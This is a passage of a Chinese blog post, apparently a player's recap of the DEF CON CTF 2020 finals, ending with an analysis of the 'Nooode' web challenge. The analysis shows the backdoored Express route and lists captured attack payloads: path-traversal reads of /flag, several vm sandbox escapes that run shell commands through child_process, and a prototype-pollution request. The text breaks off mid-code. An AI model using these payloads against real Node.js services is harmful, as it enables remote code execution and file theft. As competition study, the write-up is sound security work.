WWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003453.jpg" alt=""></p><p>是我本人没错了（</p><p>后面主办方公布了 21 点的 WriteUp: <a href="https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack" target="_blank" rel="noopener">https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack</a> </p><p>虽然没怎么看懂逆向部分，但是看起来我们那个改下注分数的做法是解法之一，并且其他解法看起来也是挺有意思的。</p><h2 id="Shift-4"><a href="#Shift-4" class="headerlink" title="Shift 4"></a>Shift 4</h2><p>在最后一天开始几小时之后，主办方终于放出了一个本场唯一一个 Web ，题目地址在 <a href="https://github.com/o-o-overflow/dc2020f-nooode-public" target="_blank" rel="noopener">dc2020f-nooode-public</a> ，整个题目我引用 PPP 对于这个题目的评价——“By the start of the final day, all of us were pretty much at our limits. Fortunately, the OOO maintained a tradition of releasing <strong>silly web</strong> problems near the end of the competition, and this year was no exception.”（此处采用了引用论证，引用了比较权威的人士对于题目的评价，增加了说服力）</p><p>基本上可以说是一句话在 Nodejs 上的完美体现，于是一开始就有人开始直接打了，我们也马上发现了这个 Backdooor ，于是我们也开始打，但是由于这个 Backdooor 真的是 silly ，很多队都迅速修了（除了 pasten 貌似没人参赛），后面也就没什么打法了。后面通过我们队里巨强的某师傅上了他写的巨强的 WAF ，我们拥有了巨强的防守能力。</p><p>于是就跟 A0E 某师傅尬聊了，</p><p>But 比赛过程中，有一轮突然我们又可以打很多队，突然发现主办方貌似又在没提前通知的情况下（也好像是通知了我没注意）重置了各队伍的环境，我们发现了又立马修了一波，然后发现是加强了 Check ，只能把超强师傅写的超强 WAF 瞎掉了，因此又掉了一些分（</p><p>But 比赛过程中，我们貌似有一个非 Web AWD 题目提交的 Patch 没通过而主办方没通知我们就立马断了我们跳板机网络，导致影响了我们大概两轮的操作。</p><p>Web 后面会单独做一些简单的分析，Web 题比较让我意外的是，A0E 他们使用的是黑名单过滤的机制，被我们的超级大师傅手动绕了，打了两回合就被修了，这也成了后面的一个伏笔。（某个渣男竟然跟我说要睡了却还在看流量</p><p>Stealth Port 的流量官方也公布了：<a href="https://oooverflow.io/dc-ctf-2020-finals/stealth.txt" target="_blank" rel="noopener">https://oooverflow.io/dc-ctf-2020-finals/stealth.txt</a> ，虽然看的有点迷惑，不过还是可以看到最后我们 Web 确实打了他们一波。</p><p>后面封榜然后到结束，基本就没有什么操作了，封榜前我看了一下分数差距，我觉得我们是应该跟 HITCON 争第三，PPP 跟 A0E 抢第一。</p><p>结束之后，虽然窗外的阳光格外的刺眼，北京早高峰伴随着汽车的鸣笛已经纷至沓来，但是室内我们比较平静，大家都收拾收拾东西，捡了捡垃圾方便阿姨打扫，随便聊了聊看了看其他队对于这次比赛的吐槽，然后就都各自回去休息了。我回去后开着 DEFCON 直播等了好一会，发现他们还挺磨蹭的，顺便洗了个澡，回来等待着揭晓最终结果。</p><p>后面公布榜单，得知我们是拿到了第四名，自己倒也没有什么特别的心情，知道之后也就整理整理这两天的题目，看了看大家对于这次比赛的评论，之后就睡了。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013012759.jpeg" alt=""></p><p>倒是在揭晓一二名的时候，主办方应该是特地做了一个分数动态图来显示最后比赛的激烈，烘托一下紧张的氛围，最后显示 A0E 以 2 分的优势险胜 PPP 拿到了冠军，也意味着刷新了中国大陆战队在 DEFCON CTF 上取得的最好的成绩，也算谁见证了一次历史吧 XD</p><h2 id="Nooode"><a href="#Nooode" class="headerlink" title="Nooode"></a>Nooode</h2><p>题目地址：<a href="https://github.com/o-o-overflow/dc2020f-nooode-public" target="_blank" rel="noopener">https://github.com/o-o-overflow/dc2020f-nooode-public</a> ，感兴趣的同学可以去分析复现一下。</p><p>Web 题问题主要是在 public-nooode/routes/config.js 文件中存在一处 BackDooor </p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="hljs-string">'/validated/:lib?/:f?'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">let</span> config = res.locals.config;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (!req.params.lib) req.params.lib = <span class="hljs-string">"json-schema"</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (!req.params.f) req.params.f = <span class="hljs-string">"validate"</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> jsonlib = <span class="hljs-built_in">require</span>(req.params.lib)</span><br><span class="line">  <span class="hljs-keyword">let</span> valid = jsonlib[req.params.f](req.body)</span><br><span class="line">  <span class="hljs-keyword">if</span> (!valid) {</span><br><span class="line">    res.send(<span class="hljs-string">"validator failed"</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span></span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">let</span> p;</span><br><span class="line">  <span class="hljs-keyword">if</span> (config.path) { </span><br><span class="line">    p = config.path;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (config.filepath) {</span><br><span class="line">    p = config.filepath;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> data = fs.readFileSync(p).toString()</span><br><span class="line">  <span class="hljs-keyword">try</span> {</span><br><span class="line">    data = <span class="hljs-built_in">JSON</span>.parse(data)</span><br><span class="line">    <span class="hljs-keyword">if</span> (_.isEqual(req.body, data))</span><br><span class="line">      res.json(data)</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    res.send({ <span class="hljs-string">"validator"</span>: valid, <span class="hljs-string">"data"</span>:data, <span class="hljs-string">"msg"</span>: <span class="hljs-string">"data is corrupted"</span>})</span><br><span class="line">  } <span class="hljs-keyword">catch</span> {</span><br><span class="line">    res.send({ <span class="hljs-string">"validator"</span>: valid, <span class="hljs-string">"data"</span>:data})</span><br><span class="line">  }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>比较熟悉的同学可以一眼就看看到问题所在了。</p><p>由于官方提供的是整场比赛所有的流量包过大，并没有具体分类，整个流量包多达 200 GB ，而且对于 Web 题目来说，基本几个流量包就能拿到大多数的 Payload 了，所以我拿了我手头上当时下载的基本分部了大多数时间段的流量包，提取了一下 HTTP 流量并进行了简单统计处理，并按照出现的次数进行了从高到低的排序，得到了以下的结果：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013015810.png" alt=""></p><p>奇怪，中间好像混入了什么奇怪的东西（</p><p>当然其他流量包或许还可能存在一些其他的 Payload ，但是基本该题所有的点都在这了。并且每个流量包都充斥着大量的垃圾流量，接下来就是垃圾流量大赏，原来你就是中国文化宣传大使？不用我多说就知道了吧，跟某个师傅打过 AWD 的都应该知道是谁发的这些垃圾流量。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013020131.png" alt=""></p><h3 id="Require"><a href="#Require" class="headerlink" title="Require"></a>Require</h3><p>一开始大多队伍都打的是<code>require</code>直接包含的点，由于题目开了 debug 报错，在使用<code>require</code>包含 flag 的时候会直接报错回显 flag ，如下 000AAA 即为 flag</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Invalid or unexpected token<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>/flag:1</span><br><span class="line">000AAAA</span><br><span class="line">^^^</span><br><span class="line"></span><br><span class="line">SyntaxError: Invalid or unexpected token</span><br><span class="line">    at wrapSafe (internal/modules/cjs/loader.js:1070:16)</span><br><span class="line">    at Module._compile (internal/modules/cjs/loader.js:1120:27)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1176:10)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:1000:32)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:899:14)</span><br><span class="line">    at Module.require (internal/modules/cjs/loader.js:1042:19)</span><br><span class="line">    at Module.Hook._require.Module.require (/usr/local/lib/node_modules/pm2/node_modules/require-in-the-middle/index.js:80:39)</span><br><span class="line">    at require (internal/modules/cjs/helpers.js:77:18)</span><br><span class="line">    at /service/routes/config.js:21:17</span><br><span class="line">    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>使用这个思路的 payload 就有很多变种了，例如：</p><ul><li><code>POST /config/validated/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1</code> 加上一些 body 内容、或者进行全 urlencode 、又或者再路径后面加一个路径<code>POST /config/validated/%2Fflag/a HTTP/1.1</code></li><li><code>POST /config/validated/%2ffl%61g HTTP/1.1</code></li><li><code>POST /config/validated/%2fproc%2fself%2froot%2ffl%61g HTTP/1.1</code></li></ul><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p>还有就是可以通过内置的 vm lib ，由于 vm lib 逃逸已经被弄烂了，基本能找到可以直接利用的 exp 直接拿 flag</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/vm/runInNewContext</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 160</span><br><span class="line"></span><br><span class="line">["const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">200</span> OK</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json; charset=utf-8</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 85</span><br><span class="line"><span class="hljs-attribute">ETag</span>: W/"55-/Dqsanp9FGAj8iXHTLNo/PbZBTc"</span><br><span class="line"><span class="hljs-attribute">Date</span>: Tue, 13 Oct 2020 10:52:05 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">{"validator":"000AAAA\n","data":{"treasure":"data-piece2"},"msg":"data is corrupted"}</span><br></pre></td></tr></tbody></table></figure><p></p><p>后面的就是基本是基于 post body 的变形了：</p><ul><li><code>["const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li><li><code>["const p = this.constructor.constructor('return this.process')(); p.mainModule.require('fs').readFileSync('/f'+'l'+'a'+'g').toString()"]</code></li><li><code>["p = this.constructor.constructor(\"return process\")(); r = p.mainModule.require; fs = r(\"fs\"); throw new Error(fs.readFileSync(\"/flag\").toString())"]</code></li><li><code>["var process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li><li><code>["p = this.constructor.constructor(\"return process\")(); r = p.mainModule.require; fs = r(\"fs\"); fs.readFileSync(\"/flag\").toString()"]</code></li><li><code>["const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li><li><code>["const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li><li><code>["var process = this.constructor.constructor(\"return process\")(); p.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li><li><code>["this.constructor.constructor('return process')().mainModule.require('fs').readFileSync('/f'+'l'+'a'+'g')+[]"]</code></li><li><code>["this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /f*')+[]"]</code></li><li><code>["const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /*g').toString()"]</code></li></ul><h3 id="flat"><a href="#flat" class="headerlink" title="flat"></a>flat</h3><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/flat/unflatten</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 29</span><br><span class="line"></span><br><span class="line">{"__proto__.path": "/flag"}</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 